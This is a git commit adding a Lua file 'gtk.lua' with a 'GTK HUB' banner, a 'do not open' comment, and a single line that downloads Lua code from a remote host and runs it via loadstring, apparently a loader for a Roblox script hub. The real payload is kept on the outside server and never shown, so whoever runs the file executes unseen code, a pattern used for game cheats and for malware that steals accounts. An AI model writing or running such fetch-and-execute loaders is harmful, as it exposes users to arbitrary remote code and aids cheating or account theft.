c38f4fcc9d7a21b3ee7396b2b6056ef6c681fd82
wefwef6528842 <gatikbahet041211@gmail.com>
2025-09-07 18:28:39 +0530

    Create gtk.lua

---
+++ gtk.lua
@@ -0,0 +1,12 @@
+--[[
+
+   ___ _____ _  __  _  _ _   _ ___ 
+  / __|_   _| |/ / | || | | | | _ )
+ | (_ | | | | ' <  | __ | |_| | _ \
+  \___| |_| |_|\_\ |_||_|\___/|___/
+
+]]--
+
+-- do not open
+
+loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/d53d8bf3bf1cb5fbec17e2e9fce41d5a"))()
